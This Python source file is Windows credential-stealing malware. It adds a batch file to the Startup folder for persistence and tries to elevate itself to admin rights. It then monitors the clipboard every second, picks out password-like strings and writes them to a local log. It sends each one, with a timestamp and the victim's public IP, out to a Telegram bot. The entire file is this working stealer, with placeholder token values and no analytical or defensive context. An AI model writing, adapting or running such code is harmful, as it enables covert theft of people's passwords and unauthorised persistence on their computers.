import ctypes
from ctypes import windll
import getpass as gp
import http.client
import sys
import time
from datetime import datetime
import pyperclip
import regex as re
import requests
import glob

MY_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
# telegram token and id
TOKEN = 'some_token'
ADMIN_ID = 'some_id'
USER_NAME = gp.getuser()
DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/get_pass_to_comp.exe'
STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
               f'Windows/Start Menu/Programs/Startup/'

# temporally variable for clipboard
CLIPBOARD_STRING = ''


# Check startup
def check_startup():
    start_up = []
    start_file = 'open.bat'
    for apps in glob.glob(STARTUP_PATH):
        start_up.append(apps.split('\\')[-1])
        if start_file in start_up:
            return True
        else:
            return False


# check admin rights
def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# create bat
def create_bat():
    if check_startup():
        pass
    elif not check_startup():
        try:
            with open(STARTUP_PATH + '\\' + 'open.bat', 'w+') as bat_file:
                bat_file.write(f'start ""  {DOWNLOADS_PATH}')
        except:
            # Re-run the program with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


# Clean clipboard before start interception
def clipboard_cleaner():
    if windll.user32.OpenClipboard(None):
        windll.user32.EmptyClipboard()
        windll.user32.CloseClipboard()


# find digits and letters in string:
def interceptor_passwords(a_string):
    rx = re.compile(r'(?=\d++[A-Za-z]+[\w@]+|[a-zA-Z]++[\w@]+)[\w@]{2,}')
    return '\n'.join(rx.findall(a_string))


# ip finder
def ip_finder():
    conn = http.client.HTTPConnection('ifconfig.me')
    conn.request('GET', '/ip')
    try:
        return conn.getresponse().read()
    except:
        return 'Can not find ip'


def start_loop():
    # string for intercept pass
    pass_string = ''
    global CLIPBOARD_STRING
    # variable for ip
    ip = ip_finder()
    while True:
        # create / open file for save passwords:
        f = open('intercepted_passwords.txt', 'a')
        # assign string to clipboard:
        CLIPBOARD_STRING = pyperclip.paste()
        # check password in list and check is link or not:
        for _ in interceptor_passwords(CLIPBOARD_STRING):
            if CLIPBOARD_STRING != pass_string and 'http' not in CLIPBOARD_STRING:
                caught_pass = interceptor_passwords(CLIPBOARD_STRING)
                # format message to telegram
                message = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id=' \
                          f'{ADMIN_ID}&text={f"Password: {caught_pass} used {MY_TIME} IP: {ip}"}'
                if caught_pass is not None:
                    # add intercepted pass and used time and ip to doc:
                    print(caught_pass, 'used', MY_TIME, 'IP:', ip, file=f)
                    f.close()
                    # send message to telegram
                    requests.get(message)
            pass_string = CLIPBOARD_STRING
        time.sleep(1)


if __name__ == '__main__':
    check_startup()
    check_admin()
    create_bat()
    clipboard_cleaner()
    interceptor_passwords(CLIPBOARD_STRING)
    start_loop()
